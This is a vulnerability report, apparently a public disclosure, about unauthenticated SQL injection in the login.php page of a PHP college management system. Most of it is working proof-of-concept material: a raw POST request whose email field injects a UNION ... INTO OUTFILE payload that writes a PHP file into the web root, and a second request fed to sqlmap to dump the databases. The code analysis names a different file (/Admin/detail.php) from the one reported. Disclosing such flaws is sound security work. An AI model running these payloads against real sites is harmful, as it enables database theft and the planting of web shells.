# College_Management_System_In_PHP has write Trojan and sql injection vulnerability.

## supplier
https://code-projects.org/college-management-system-in-php-with-source-code/
## Vulnerability file
/Login/login.php
## describe
Through code audit, when there is an unauthorized SQL injection vulnerability in the Login/login.php of the College_Management_System_In_PHP_With_Source_Code foreground login portal, all the information of the database can be obtained without authorization, and arbitrary commands may be executed.

control parameter: $username, $_POST['email']

## code analysis
The **$username**parameters of the /Admin/detail.php are not filtered and concatenated into the SQL statement for execution. 

![image-20241106213724217](https://github.com/user-attachments/assets/dc7db8ca-4865-4049-bd0d-75a9fd16152e)



## POC

### RCE

```
POST /Login/login.php HTTP/1.1
Host: college-management-system
Content-Length: 160
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://college-management-system
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://college-management-system/Login/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=oa117fdapnuo3drltanp5r545l
Connection: close

email=1' or 1=1 union select 1,2,3,4,'<?php phpinfo();?>' into outfile 'D:/phpstudy_pro/WWW/College-Management-System/phpinfo.php';--+&password=1&btnlogin=LOGIN
```

The Trojan file is generated phpinfo.php in the root directory of the website, we access the phpinfo.php file through the browser, we can see that 1,2,3,4 and <?php phpinfo();?> are all generated into the file, and the access is resolved

![image-20241106214026957](https://github.com/user-attachments/assets/1cedae93-39a1-4e00-a009-f9e2a84a4436)

### GET DATA

```
POST /Login/login.php HTTP/1.1
Host: college-management-system
Content-Length: 160
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://college-management-system
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://college-management-system/Login/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=oa117fdapnuo3drltanp5r545l
Connection: close

email=1*&password=1&btnlogin=LOGIN
```

save as 1.txt 

excute the command 

```
python sqlmap.py -r 1.txt --dbs
```

![image-20241106215739160](https://github.com/user-attachments/assets/441372cf-cce6-4003-bf91-eb92d974fd81)